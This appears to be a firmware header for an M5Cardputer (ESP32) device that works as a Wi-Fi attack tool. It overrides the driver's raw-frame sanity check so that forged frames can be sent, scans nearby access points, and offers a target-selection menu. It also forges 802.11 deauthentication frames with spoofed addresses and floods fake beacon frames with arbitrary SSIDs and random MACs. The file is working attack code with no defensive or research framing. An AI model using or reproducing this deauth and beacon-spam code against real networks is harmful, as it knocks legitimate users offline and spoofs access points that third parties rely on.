#ifndef WIFI_H
#define WIFI_H

#include <M5Cardputer.h>

#include "firmware/menu.h"

#define CHANNEL 11
#define MAX_AP_NUM 20

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}


int start_wifi(wifi_mode_t mode, bool promiscious) {
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(mode));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(promiscious));

    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(20));

    return 0;
}

int stop_wifi() {
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_deinit());

    return 0;
}

typedef struct {
    char name[32];
    uint8_t address[6];
} AP;

AP* scan_wifi_ap(int *ap_count) {
    uint16_t num_aps = MAX_AP_NUM;
    wifi_ap_record_t ap_records[MAX_AP_NUM];
    esp_err_t ret;

    ret = esp_wifi_scan_start(NULL, true);
    if (ret != ESP_OK) {
        M5.Display.printf("Failed to start scan: %s\n", esp_err_to_name(ret));
        return NULL;
    }

    ret = esp_wifi_scan_get_ap_records(&num_aps, ap_records);
    if (ret != ESP_OK) {
        M5.Display.printf("Failed to get AP records: %s\n", esp_err_to_name(ret));
        return NULL;
    }

    AP *ap_info_list = (AP *)malloc(num_aps * sizeof(AP));
    if (ap_info_list == NULL) {
        M5.Display.printf("Failed to allocate memory for AP info list\n");
        return NULL;
    }

    for (int i = 0; i < num_aps; i++) {
        strncpy(ap_info_list[i].name, (char*)ap_records[i].ssid, sizeof(ap_info_list[i].name) - 1);
        ap_info_list[i].name[sizeof(ap_info_list[i].name) - 1] = '\0'; // Ensure null-termination

        memcpy(ap_info_list[i].address, ap_records[i].bssid, sizeof(ap_records[i].bssid));
    }

    *ap_count = num_aps;
    return ap_info_list;
}

void generate_random_mac(uint8_t *mac_addr) {
    mac_addr[0] = 0x02;
    for (int i = 1; i < 6; i++) {
        mac_addr[i] = rand() % 256;
    }
}

void send_beacon(const char *ssid, const uint8_t *mac_addr, uint8_t channel) {
    uint8_t beacon_frame[128] = {0};
    int ssid_len = strlen(ssid);
    int frame_len = 0;

    beacon_frame[0] = 0x80;
    beacon_frame[1] = 0x00;

    beacon_frame[2] = 0xff;
    beacon_frame[3] = 0xff;

    memset(beacon_frame + 4, 0xff, 6);

    memcpy(beacon_frame + 10, mac_addr, 6);

    memcpy(beacon_frame + 16, mac_addr, 6);

    beacon_frame[22] = 0xc0;
    beacon_frame[23] = 0x6c;

    memset(beacon_frame + 24, 0x01, 8);

    beacon_frame[32] = 0x64;
    beacon_frame[33] = 0x00;

    beacon_frame[34] = 0x01;
    beacon_frame[35] = 0x04;

    frame_len = 36;

    beacon_frame[frame_len++] = 0x00;
    beacon_frame[frame_len++] = ssid_len;
    memcpy(beacon_frame + frame_len, ssid, ssid_len);
    frame_len += ssid_len;

    beacon_frame[frame_len++] = 0x01;
    beacon_frame[frame_len++] = 0x08;
    uint8_t supported_rates[] = {0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c};
    memcpy(beacon_frame + frame_len, supported_rates, sizeof(supported_rates));
    frame_len += sizeof(supported_rates);

    beacon_frame[frame_len++] = 0x03;
    beacon_frame[frame_len++] = 0x01;
    beacon_frame[frame_len++] = channel;

    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
}


static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr) {
    static uint8_t deauth_frame[sizeof(deauth_frame_default)];

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    memcpy(&deauth_frame[4], source_mac, 6);
    memcpy(&deauth_frame[10], ap_addr, 6);
    memcpy(&deauth_frame[16], client_addr, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

AP* getSelectedAPs(menu Menu, AP* ap_info_list, int* selected_count) {
    AP* selected_aps = (AP*)malloc(Menu.length * sizeof(AP));
    if (!selected_aps) {
        printf("Memory allocation failed for selected APs.\n");
        return NULL;
    }

    int count = 0;
    for (int i = 0; i < Menu.length - 1; i++) {
        if (Menu.elements[i].options[Menu.elements[i].selector][0] == 'x') {
            memcpy(&selected_aps[count], &ap_info_list[i], sizeof(AP));
            count++;
        }
    }

    selected_aps = (AP*)realloc(selected_aps, count * sizeof(AP));

    *selected_count = count;
    return selected_aps;
}

AP* select_wifi_menu(int *selected_ap_count) {
    int ap_count;
    AP* ap_info_list = scan_wifi_ap(&ap_count);

    if (!ap_info_list) {
        printf("No access points found.\n");
        return NULL;
    }

    int Selector = 0;
    menu Menu;
    Menu.name = "Wifi Select";
    Menu.length = ap_count + 1;  // +2 for the AP mac and Select items
    Menu.elements = (item *)malloc(Menu.length * sizeof(item));

    for (int i = 0; i < ap_count; i++) {
        snprintf(Menu.elements[i].name, sizeof(Menu.elements[i].name),
                     "%.*s-%02x:%02x",
                     7, ap_info_list[i].name,
                     ap_info_list[i].address[4], ap_info_list[i].address[5]);
        Menu.elements[i].type = 0;
        Menu.elements[i].length = 2;
        Menu.elements[i].selector = 0;
        Menu.elements[i].options[0] = " ";
        Menu.elements[i].options[1] = "x";
        Menu.elements[i].options[2] = NULL;
    }

    strcpy(Menu.elements[ap_count].name, "Select");
    Menu.elements[ap_count].type = 1;
    Menu.elements[ap_count].length = 0;
    for (int i = 0; i < MAX_OPTIONS; i++) {
        Menu.elements[ap_count].options[i] = NULL;
    }

    drawMenu(Menu, Selector);

    int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;

    while (1) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange()) {
            UPp = M5Cardputer.Keyboard.isKeyPressed(';');
            DOWNp = M5Cardputer.Keyboard.isKeyPressed('.');
            LEFTp = M5Cardputer.Keyboard.isKeyPressed(',');
            RIGHTp = M5Cardputer.Keyboard.isKeyPressed('/');
            SELECTp = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
            RETURNp = M5Cardputer.Keyboard.isKeyPressed('`');

            if (RETURNp) {
                return 0;
            }
           else if (UPp) {
                Selector = intChecker(Selector - 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (DOWNp) {
                Selector = intChecker(Selector + 1, Menu.length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (LEFTp && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector - 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            else if (RIGHTp  && (Menu.elements[Selector].type == 0)) {
                Menu.elements[Selector].selector = intChecker(Menu.elements[Selector].selector + 1, Menu.elements[Selector].length);
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            if (SELECTp) {
                if (Selector == (Menu.length - 1)) {  // Select
                    for (int i = 0; i < ap_count; i++) {
                        AP* selected_aps = getSelectedAPs(Menu, ap_info_list, selected_ap_count);

                        return selected_aps;
                    }
                }
            }
            drawMenu(Menu, Selector);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}








#endif
